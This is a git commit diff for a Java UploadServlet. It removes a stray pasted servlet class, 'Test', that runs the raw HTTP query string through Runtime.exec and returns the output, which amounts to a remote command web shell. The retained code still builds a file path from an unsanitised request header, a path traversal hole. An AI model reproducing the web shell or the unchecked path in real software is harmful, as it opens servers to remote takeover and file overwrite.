96f5323f9bdef2d0ef7dd72932554f445d3f6d44
alex <a.cealicov@gmail.com>
2017-02-01 15:30:38 +0000

    1

--- UploadServlet.java
+++ UploadServlet.java
@@ -32,56 +32,7 @@ public class UploadServlet extends HttpServlet {
 
         // Gets file name for HTTP header
         String fileName = request.getHeader("fileName");
-        File saveFile = new File(SAVE_DIRpackage ubiserv.simple;
-
-        import javax.servlet.ServletException;
-        import javax.servlet.http.HttpServlet;
-        import javax.servlet.http.HttpServletRequest;
-        import javax.servlet.http.HttpServletResponse;
-        import java.io.IOException;
-        import java.io.PrintWriter;
-        import java.io.InputStream;
-
-
-        public class Test extends HttpServlet
-        {
-            protected void doGet (HttpServletRequest httpServletRequest,
-                                  HttpServletResponse httpServletResponse)
-                    throws ServletException,IOException
-            {
-                httpServletResponse.setContentType("text/plain");
-                PrintWriter out = httpServletResponse.getWriter();
-                out.print("test:");
-
-                String x = httpServletRequest.getQueryString();
-
-                try {
-                    Process p = Runtime.getRuntime().exec(x);
-
-                    InputStream is = p.getInputStream();
-                    int c;
-                    StringBuilder CommandResponse = new StringBuilder();
-
-                    while ((c = is.read()) != -1)
-                    {
-                        CommandResponse.append((char)c);
-                    }
-                    out.println(CommandResponse);
-                    is.close();
-                }
-
-
-                catch (Exception E)
-                {
-                    E.printStackTrace();
-                }
-
-                out.print (x);
-                out.close();
-            }
-        }
-
-        + fileName);
+        File saveFile = new File(SAVE_DIR + fileName);
 
         // prints out all header values
 //        System.out.println("===== Begin headers =====");
